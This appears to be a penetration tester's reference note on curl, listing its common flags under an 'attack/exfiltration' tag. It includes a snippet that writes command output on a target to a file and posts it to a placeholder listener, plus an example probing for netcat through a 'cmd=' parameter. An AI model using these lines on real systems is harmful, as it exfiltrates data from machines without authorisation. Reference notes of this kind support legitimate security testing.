---
tags:
  - "#type/tool" 
  - "#attack/exfiltration" 
Link: 
Purpose: send HTTP requests manually
---
# Info

send HTTP requests manually from the commandline

# Usage

eg. `curl -X GET http://127.0.0.1:5984/`

| Argument                   | Purpose                                                                                                                                                            |
| -------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `-X <VERB>`                | set request type (verb) eg. `POST`,`GET`                                                                                                                           |
| `-H <key: value>`          | set HTTP header - e.g. `-H 'Content-Type: application/json'`                                                                                                       |
| `--data <data>`            | set data                                                                                                                                                           |
| `--data-urlencode`         | specify url-encoded data - e.g. `--data-urlencode "cmd=which nc"`                                                                                                  |
| `-c <path>`                | store received cookies in file                                                                                                                                     |
| `-b <path>`                | send cookies in file                                                                                                                                               |
| `-i`                       | show respnse headers in output                                                                                                                                     |
| `--path-as-is`             | usually, curl follows RFC 3986 rules for URI path normalization (removing `/../` and `/./` segments) - with this option, paths are interpreted exactly as supplied |
| `--upload-file <filepath>` | upload a file - use with POST                                                                                                                                      |
| `-O`                       | save downloaded file using original filename                                                                                                                       |
| `-o <path>`                | save file at path                                                                                                                                                  |

# Snippets

## Send command output using curl

Helpful for troubleshooting payloads / commands on targets without a proper shell.

1. write output to file
2. send file contents with curl

 `<command> &> /tmp/output; curl --data @/tmp/output http://<ip>:<port>/`
